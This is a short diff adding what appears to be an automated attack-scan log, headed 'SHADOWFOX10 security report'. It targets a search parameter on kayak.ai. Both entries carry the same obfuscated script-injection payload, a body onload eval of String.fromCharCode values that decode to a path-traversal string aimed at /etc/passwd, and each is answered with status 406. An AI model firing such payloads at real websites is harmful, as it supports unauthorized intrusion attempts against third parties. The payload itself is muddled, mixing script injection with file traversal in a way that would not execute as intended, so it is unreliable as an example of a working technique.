@@ -1,0 +1,9 @@
+=== SHADOWFOX10 :: SECURITY REPORT ===
+Target: kayak.ai?q=<body onload=eval(String.fromCharCode(46,46,47,46,46,47,46,46,47,101,116,99,47,112,97,115,115,119,100))>
+
+[STATUS]: 406
+[PAYLOAD]: <body onload=eval(String.fromCharCode(46,46,47,46,46,47,46,46,47,101,116,99,47,112,97,115,115,119,100))>
+---
+[STATUS]: 406
+[PAYLOAD]: <body onload=eval(String.fromCharCode(46,46,47,46,46,47,46,46,47,101,116,99,47,112,97,115,115,119,100))>
+---
